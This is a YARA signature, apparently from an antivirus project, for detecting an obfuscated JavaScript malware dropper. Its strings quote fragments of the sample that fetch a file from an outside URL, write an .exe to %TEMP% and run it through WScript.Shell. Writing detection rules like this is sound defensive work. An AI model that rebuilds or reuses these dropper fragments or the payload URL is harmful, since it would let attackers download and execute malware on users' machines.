rule sig_20160328_ffb885fe0ea5eaf0f2147babeb66c694 {
  meta:
    description = "datamaliciousorder - file 20160328_ffb885fe0ea5eaf0f2147babeb66c694.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a6ac3d9d3166418b7b192244e0bd3ed0f3a133b451a58c391dae2e87e3fc33d6"

  strings:
    $s1  = "function Vnmtjxzh() {return Sswqrrnc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"HuMn7cbG.exe\";};" fullword ascii
    $s2  = "do {WScript[Gximjllut](Rojri() * 11)} while (Kcwgo[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Sswqrrnc = function Skpql() {return WScript[Kzbhyrxlt](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Kcwgo[Bgtcgc](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s5  = "function Wyokh(Psdqgvrlfb, Mezsocmfy){return Psdqgvrlfb - Mezsocmfy;};" fullword ascii
    $s6  = "function Fdmqeqal(Lzsjxs){Sswqrrnc[\"Run\"](Lzsjxs, Qomceemgtv, Qomceemgtv);};" fullword ascii
    $s7  = "function Wancfmld() {return ((Vfdvbxz == true) && (Vfdvbxz == Mcxmd)) ? 1 : Qomceemgtv;};" fullword ascii
    $s8  = "function Rojri(){return 22;};" fullword ascii
    $s9  = "function Fcsvws(){return Fshywhicrg;};" fullword ascii
    $s10 = "function Wvpneynvl()" fullword ascii
    $s11 = " while (Tvfmkz){" fullword ascii
    $s12 = "var Mcxmd = false;" fullword ascii
    $s13 = "Mcxmd = true; " fullword ascii
    $s14 = "return Wyokh(Npnetnudm, Meplev);" fullword ascii
    $s15 = "Vfdvbxz = true; " fullword ascii
    $s16 = "function Dtiszydat(Mrhua) {var Fzufpb = (1, 2, 3, 4, 5, Mrhua); return Fzufpb;};" fullword ascii
    $s17 = "var Bldtrvdqpv = new this[\"Date\"]();" fullword ascii
    $s18 = "var Lsviy = false;" fullword ascii
    $s19 = "function Tbzrmizrae(){return Kzbhyrxlt;};" fullword ascii
    $s20 = "var Vfdvbxz = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}